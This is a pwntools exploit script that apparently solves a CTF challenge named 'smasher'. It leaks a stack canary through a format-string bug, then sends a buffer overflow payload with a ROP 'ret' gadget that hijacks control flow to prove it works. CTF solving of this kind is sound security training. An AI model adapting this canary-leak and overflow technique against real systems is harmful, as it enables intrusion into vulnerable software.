#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import argparse

# --- Setup ---
# Set up the context for the binary
context.binary = elf = ELF('./smasher', checksec=False)

# --- Command Line Arguments ---
# Allows switching between local, remote, and debug modes
parser = argparse.ArgumentParser(description="Solver for the 'smasher' CTF challenge.")
parser.add_argument("--remote", action="store_true", help="Run the exploit against the remote server.")
args = parser.parse_args()

# --- Connection Details ---
REMOTE_HOST = '10.1.2.228'
REMOTE_PORT = 1339

def get_process():
    """Returns a process object for either local or remote interaction."""
    if args.remote:
        return remote(REMOTE_HOST, REMOTE_PORT)
    else:
        return process()

def find_canary_offset():
    """
    Automates finding the format string offset for the canary locally.
    It checks stack positions for a value ending in a null byte.
    """
    log.info("Attempting to find the canary offset automatically (local only)...")
    # Start the check from a higher offset (e.g., 5). The first few values on the
    # stack are often arguments or pointers which can lead to false positives.
    # The real canary is typically further down.
    for i in range(5, 50): # Check a reasonable number of offsets
        try:
            # Offset finding must be done locally.
            p = process()
            payload = f'%{i}$p'.encode()
            p.sendlineafter(b'Masukkan pesan: ', payload)
            p.recvuntil(b'LOG: ')
            leaked_value_str = p.recvline().strip()
            
            if not leaked_value_str.startswith(b'0x'):
                p.close()
                continue

            leaked_value = int(leaked_value_str, 16)

            # A valid canary on x86-64 will be an 8-byte value with a null LSB.
            if (leaked_value & 0xff) == 0x00:
                log.success(f"Found canary at offset {i}!")
                p.close()
                return i
            
            p.close()
        except (EOFError, PwnlibException):
            if 'p' in locals() and p.poll() is None:
                p.close()
            continue
    
    return None

def solve():
    """
    Main exploit logic.
    1. Finds the canary offset locally.
    2. Connects to the target (local or remote).
    3. Leaks the canary for the current session.
    4. Crafts and sends a buffer overflow payload that includes a ROP gadget
       to fix stack alignment and hijacks control flow.
    """
    
    # =========================================================================
    # STAGE 1: FIND OFFSET AND LEAK CANARY
    # =========================================================================
    canary_offset = find_canary_offset()

    if not canary_offset:
        log.failure("Could not find the canary offset. Exiting.")
        return

    # Start the actual process for the exploit
    p = get_process()
    
    log.info("Leaking canary for the current session...")
    payload_leak = f'%{canary_offset}$p'.encode()
    p.sendlineafter(b'Masukkan pesan: ', payload_leak)
    p.recvuntil(b'LOG: ')
    leaked_canary_str = p.recvline().strip()
    canary = int(leaked_canary_str, 16)
    log.success(f"Leaked canary for this run: {hex(canary)}")


    # =========================================================================
    # STAGE 2: BUFFER OVERFLOW
    # =========================================================================
    log.info("STAGE 2: Preparing the buffer overflow payload...")

    # Use ROP to find a 'ret' gadget. This is crucial for 16-byte stack alignment
    # in x86-64, which is a common reason for crashes after hijacking control flow.
    rop = ROP(elf)
    ret_gadget = rop.find_gadget(['ret'])[0]
    log.info(f"Found 'ret' gadget for stack alignment: {hex(ret_gadget)}")

    padding = b'A' * 136
    # Target handle_input instead of main. Re-entering main can be unstable
    # due to the corrupted stack. handle_input is a more stable target to prove control.
    return_address = p64(elf.symbols.handle_input)
    log.info(f"Target return address (handle_input): {hex(elf.symbols.handle_input)}")

    # The payload structure:
    # [PADDING] -> Overflows the buffer
    # [CANARY]  -> The correct, leaked canary to pass the check
    # [RBP]     -> 8 bytes of junk to overwrite the saved RBP
    # [RET]     -> The 'ret' gadget to align the stack
    # [TARGET]  -> The address we want to jump to (handle_input)
    payload = flat(
        padding,
        p64(canary),
        b'B' * 8,
        p64(ret_gadget),
        return_address
    )

    log.info("Sending final payload to trigger the overflow...")
    p.sendlineafter(b'Masukkan data: ', payload)

    # =========================================================================
    # INTERACTION
    # =========================================================================
    try:
        # If successful, we should see the initial prompt again.
        p.recvuntil(b'Selamat datang di sistem. Masukkan pesan: ', timeout=2)
        log.success("Exploit successful! We have returned to the handle_input function.")
        log.info("The challenge is confirmed to be solvable.")
    except EOFError:
        log.failure("Exploit failed. The process terminated unexpectedly.")

    # p.interactive()

if __name__ == "__main__":
    solve()
